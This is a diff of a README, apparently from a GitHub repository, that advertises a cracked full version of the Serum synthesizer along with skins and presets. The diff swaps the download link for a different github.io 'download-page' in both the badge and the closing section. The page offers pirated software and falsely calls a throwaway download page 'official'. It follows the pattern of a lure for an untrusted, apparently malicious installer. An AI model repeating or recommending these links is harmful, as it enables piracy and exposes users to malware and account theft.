@@ -2,7 +2,7 @@
 
 Welcome to the Serum Ultimate Skins Collection, the ultimate resource for music producers seeking the serum crack full version along with a vast array of exclusive skins, presets, and wavetable packs. This meticulously curated collection is designed to elevate your music production by providing high-quality assets that integrate seamlessly with the Serum synthesizer. Whether you're a beginner or a professional, these tools will help you unlock new creative possibilities and enhance your sound design workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -55,6 +55,6 @@ A: The collection requires a compatible version of Serum running on Windows 10 o
 
 ## Download
 
-For a direct and reliable download, you can [Download from official website](https://yellowtaxisave.github.io/download-page/). This link provides access to the latest version of the installer, ensuring you always have the most recent features and fixes.
+For a direct and reliable download, you can [Download from official website](https://capitals-707-bringing.github.io/download-page/). This link provides access to the latest version of the installer, ensuring you always have the most recent features and fixes.
 
 In summary, the Serum Ultimate Skins Collection is a valuable asset for any Serum user looking to enhance their creative toolkit with premium presets, customizable skins, and innovative wavetables. Download now and transform your music production experience!
